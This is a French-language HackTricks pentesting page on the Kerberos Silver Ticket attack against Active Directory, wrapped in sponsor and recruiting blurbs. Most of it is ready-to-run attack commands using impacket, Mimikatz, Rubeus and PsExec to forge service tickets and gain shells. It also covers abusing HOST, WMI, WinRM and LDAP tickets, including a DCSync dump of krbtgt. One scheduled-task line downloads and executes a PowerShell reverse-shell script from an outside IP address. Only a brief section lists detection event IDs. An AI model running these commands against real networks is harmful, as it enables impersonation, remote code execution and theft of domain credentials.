# Ticket d'argent

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière de piratage** et que vous voulez pirater l'impossible - **nous recrutons !** (_maîtrise du polonais écrit et parlé requise_).

{% embed url="https://www.stmcyber.com/careers" %}

## Ticket d'argent

L'attaque du ticket d'argent est basée sur **la création d'un TGS valide pour un service une fois que le hachage NTLM du service est obtenu** (comme le **hachage du compte PC**). Ainsi, il est possible d'**accéder à ce service** en falsifiant un TGS personnalisé **en tant que n'importe quel utilisateur**.

Dans ce cas, le **hachage NTLM d'un compte d'ordinateur** (qui est une sorte de compte utilisateur dans AD) est **possédé**. Par conséquent, il est possible de **créer** un **ticket** afin de **pénétrer dans cette machine** avec des privilèges d'**administrateur** via le service SMB. Les comptes d'ordinateur réinitialisent leurs mots de passe tous les 30 jours par défaut.

Il faut également prendre en compte qu'il est possible ET **PRÉFÉRABLE** (opsec) de **falsifier des tickets en utilisant les clés Kerberos AES (AES128 et AES256)**. Pour savoir comment générer une clé AES, consultez la section 4.4 de MS-KILE ou le script [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372).

{% code title="Linux" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```
{% endcode %}

Dans Windows, **Mimikatz** peut être utilisé pour **créer** le **ticket**. Ensuite, le ticket est **injecté** avec **Rubeus**, et enfin un shell distant peut être obtenu grâce à **PsExec**.

{% code title="Windows" %}
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

#Example using aes key
kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```
{% endcode %}

Le service **CIFS** est celui qui vous permet d'accéder au système de fichiers de la victime. Vous pouvez trouver d'autres services ici: [**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page\_id=183)**.** Par exemple, vous pouvez utiliser le service **HOST** pour créer une tâche planifiée sur un ordinateur. Ensuite, vous pouvez vérifier si cela a fonctionné en essayant de répertorier les tâches de la victime: `schtasks /S <hostname>` ou vous pouvez utiliser les services **HOST et** **RPCSS** pour exécuter des requêtes **WMI** sur un ordinateur, testez-le en faisant: `Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`

### Atténuation

Événements ID des tickets Silver (plus furtifs que les tickets Golden):

* 4624: Connexion au compte
* 4634: Déconnexion du compte
* 4672: Connexion de l'administrateur

[**Plus d'informations sur les tickets Silver sur ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

## Services disponibles

| Type de service                           | Tickets Silver du service                                                |
| ----------------------------------------- | ------------------------------------------------------------------------ |
| WMI                                       | <p>HOST</p><p>RPCSS</p>                                                  |
| PowerShell Remoting                       | <p>HOST</p><p>HTTP</p><p>En fonction du système d'exploitation également:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                     | <p>HOST</p><p>HTTP</p><p>Dans certaines occasions, vous pouvez simplement demander: WINRM</p> |
| Tâches planifiées                         | HOST                                                                     |
| Partage de fichiers Windows, également psexec | CIFS                                                                   |
| Opérations LDAP, y compris DCSync          | LDAP                                                                     |
| Outils d'administration à distance du serveur Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                       |
| Tickets Golden                            | krbtgt                                                                   |

Avec **Rubeus**, vous pouvez demander tous ces tickets en utilisant le paramètre:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

## Abus des tickets de service

Dans les exemples suivants, imaginons que le ticket soit récupéré en se faisant passer pour le compte administrateur.

### CIFS

Avec ce ticket, vous pourrez accéder aux dossiers `C$` et `ADMIN$` via **SMB** (s'ils sont exposés) et copier des fichiers vers une partie du système de fichiers distant en faisant simplement quelque chose comme:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Vous pourrez également obtenir un shell à l'intérieur de l'hôte ou exécuter des commandes arbitraires en utilisant **psexec**:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### HÔTE

Avec cette autorisation, vous pouvez générer des tâches planifiées sur des ordinateurs distants et exécuter des commandes arbitraires:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HÔTE + RPCSS

Avec ces tickets, vous pouvez **exécuter WMI dans le système victime** :
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Trouvez **plus d'informations sur wmiexec** dans la page suivante :

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HÔTE + WSMAN (WINRM)

Avec un accès winrm sur un ordinateur, vous pouvez **y accéder** et même obtenir un PowerShell :
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consultez la page suivante pour en savoir plus sur les différentes façons de se connecter à un hôte distant en utilisant winrm:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Notez que **winrm doit être actif et en écoute** sur l'ordinateur distant pour y accéder.
{% endhint %}

### LDAP

Avec ce privilège, vous pouvez extraire la base de données du contrôleur de domaine en utilisant **DCSync** :
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**En savoir plus sur DCSync** dans la page suivante:

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière en piratage** et souhaitez pirater l'impossible - **nous recrutons !** (_maîtrise du polonais à l'écrit et à l'oral requise_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
